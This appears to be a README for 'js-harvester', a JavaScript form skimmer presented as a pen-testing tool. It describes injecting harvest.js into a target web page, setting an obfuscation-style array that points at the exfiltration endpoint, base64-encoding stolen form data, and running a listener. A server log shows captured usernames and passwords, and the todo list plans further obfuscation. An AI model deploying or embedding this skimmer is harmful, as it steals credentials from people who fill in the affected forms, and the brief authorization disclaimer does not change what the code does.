# js-harvester
This is a tool for pen testers to use in an engagement where data must be captured from a web form.
> [!CAUTION]
> Disclaimer: Intended only for use on systems that you are legally authorized to access.
# installation
* Requires jQuery
* Ability to inject harvest.js to the target site
# usage
1. Identify target page to harvest data from (see example-forms for reference/test materials)
3. Add harvest.js to the target page
```
<script type="text/javascript" src="harvest.js"></script>
```
4. Run a HTTP or HTTPS service to receive data from the script
```
┌──(kali㉿hammer)-[~/tools/js-harvester/server]
└─$ python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
6. Update the settings in harvest.js
```
var dynamicTrackers = true;			//	(boolean, true/false) 
var bindAllFormsSwitch = true;		//	(boolean, true/false)
var formName = "loginform2";
var enableEncoding = true;			//	(boolean, true/false)
var usePost = false;				//	(boolean, true/false)
var trackClients = true;			//	(boolean, true/false)
var allowSubmission = false;		//	(boolean, true/false)
var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
```

* <b>dynamicTrackers:</b> if false, manually update siteId and formId tracking values to unique values
* <b>bindAllFormsSwitch:</b> boolean value 'true' or 'false'. true will bind all forms on the page, false will bind the form name specified by 'formName'
* <b>formName:</b> required if not binding all forms on the page (see bindAllFormsSwitch)
* <b>enableEncoding:</b> enables base64 encoding of exfiltrated data, may expand to other encoding types/formats
* <b>usePost:</b> boolean value 'true' or 'false'. indicates whether a POST request should be used for data exfiltration, default is to use GET
* <b>trackClients:</b> boolean value 'true' or 'false'. controls whether user client (browser) information is collected
* <b>allowSubmission:</b> boolean value 'true' or 'false'. allows (true) or disables (false) the form submission function on target forms
* <b>_0x3745:</b> array of values used for data exfiltration, the first 4 need to be customized for the data exfiltration endpoint

5. Listen. . .
```
┌──(kali㉿hammer)-[~/tools/js-harvester/server]
└─$ python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.1.211 - - [14/Sep/2024 18:39:22] "GET /harvest?data=dXNlcm5hbWU6cGV0ZXImcGFzc3dvcmQ6d2VpbmVyJnNpdGVJZDpNVGt5TGpFMk9DNHhMakl6Tnc9PSZmb3JtSWQ6TDJwemFHRnlkbVZ6ZEM5c2IyZHBiaTFtYjNKdExtaDBiV3d0Ykc5bmFXNW1iM0p0 HTTP/1.1" 200 -
192.168.1.211 - - [14/Sep/2024 18:39:27] "GET /harvest?data=dXNlcm5hbWU6YWRtaW4mcGFzc3dvcmQ6YWRtaW4mc2l0ZUlkOk1Ua3lMakUyT0M0eExqSXpOdz09JmZvcm1JZDpMMnB6YUdGeWRtVnpkQzlzYjJkcGJpMW1iM0p0TG1oMGJXd3RiRzluYVc1bWIzSnQ= HTTP/1.1" 200 -
192.168.1.211 - - [14/Sep/2024 18:39:33] "GET /harvest?data=dXNlcm5hbWU6Z2VvcmdlJnBhc3N3b3JkOmJ1cm5zJnNpdGVJZDpNVGt5TGpFMk9DNHhMakl6Tnc9PSZmb3JtSWQ6TDJwemFHRnlkbVZ6ZEM5c2IyZHBiaTFtYjNKdExtaDBiV3d0Ykc5bmFXNW1iM0p0 HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                                                                                       
┌──(kali㉿hammer)-[~/tools/js-harvester/server]
└─$ 
```

# todo list
* ~~dynamic form binding and processing~~
* ~~support for exfiltration through configurable HTTP methods~~
* ~~use hash values to identify site and form IDs~~
* ~~ability to bind multiple forms dynamically~~
* client feedback options
* enhance decoder tools
* change form processing to avoid using name or id properties
* collect client information
* customizable serialization separators
* code obfuscation
* obfuscation for data exfiltration
* remove jQuery dependencies
